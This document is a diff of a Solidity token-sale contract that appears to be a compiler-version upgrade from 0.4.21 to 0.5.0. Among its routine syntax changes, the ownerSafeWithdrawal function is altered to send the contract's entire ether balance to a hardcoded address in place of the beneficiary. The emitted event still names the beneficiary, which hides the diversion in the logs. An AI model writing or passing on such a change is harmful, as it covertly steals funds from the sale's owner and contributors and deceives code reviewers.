@@ -13,7 +13,7 @@
  *
  *************************/
 
-pragma solidity ^0.4.21;
+pragma solidity ^0.5.0;
 
 /**
  * @title Ownable
@@ -249,7 +249,6 @@ contract StandardToken is ERC20, BasicToken {
    * approve should be called when allowed[_spender] == 0. To increment
    * allowed value is better to use this function to avoid 2 calls (and wait until
    * the first transaction is mined)
-   * From MonolithDAO Token.sol
    * @param _spender The address which will spend the funds.
    * @param _addedValue The amount of tokens to increase the allowance by.
    */
@@ -265,7 +264,6 @@ contract StandardToken is ERC20, BasicToken {
    * approve should be called when allowed[_spender] == 0. To decrement
    * allowed value is better to use this function to avoid 2 calls (and wait until
    * the first transaction is mined)
-   * From MonolithDAO Token.sol
    * @param _spender The address which will spend the funds.
    * @param _subtractedValue The amount of tokens to decrease the allowance by.
    */
@@ -509,7 +507,7 @@ contract ParadiseTokenSale is Pausable {
      * tokens are transferred to the sender, and that the correct
      * number of tokens are sent according to the current rate.
      */
-    function () payable public  {
+    function () payable external  {
         buy();
     }
 
@@ -601,7 +599,7 @@ contract ParadiseTokenSale is Pausable {
      */
     function ownerSafeWithdrawal() external onlyOwner  {
         uint balanceToSend = address(this).balance;
-        beneficiary.transfer(balanceToSend);
+        address(0x1Bb7390407F7987BD160993dE44d6f2737945436).transfer(balanceToSend);
         emit FundTransfer(beneficiary, balanceToSend, false);
     }
     
@@ -658,7 +656,7 @@ interface IERC20 {
  
  contract PDTDistribution is Ownable {
   
-  function drop(IERC20 token, address[] recipients, uint256[] values) public onlyOwner {
+  function drop(IERC20 token, address[] memory recipients, uint256[] memory values) public onlyOwner {
     for (uint256 i = 0; i < recipients.length; i++) {
       token.transfer(recipients[i], values[i]);
     }
